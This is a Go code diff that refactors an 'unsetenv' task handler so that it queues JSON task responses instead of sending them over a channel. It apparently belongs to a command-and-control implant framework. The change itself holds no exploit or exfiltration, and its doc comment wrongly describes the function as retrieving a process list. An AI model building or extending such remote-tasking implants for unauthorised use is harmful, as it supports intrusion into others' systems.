@@ -4,26 +4,39 @@ import (
 	"fmt"
 	"os"
 	"strings"
-
+	"pkg/profiles"
 	"pkg/utils/structs"
+	"encoding/json"
+	"sync"
 )
 
+var mu sync.Mutex
+
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
 	params := strings.TrimSpace(task.Params)
 	err := os.Unsetenv(params)
 
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-    tMsg.Completed = true
-	tMsg.TaskResult = []byte(fmt.Sprintf("Successfully cleared %s", params))
-	threadChannel <- tMsg
+
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Successfully cleared %s", params)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
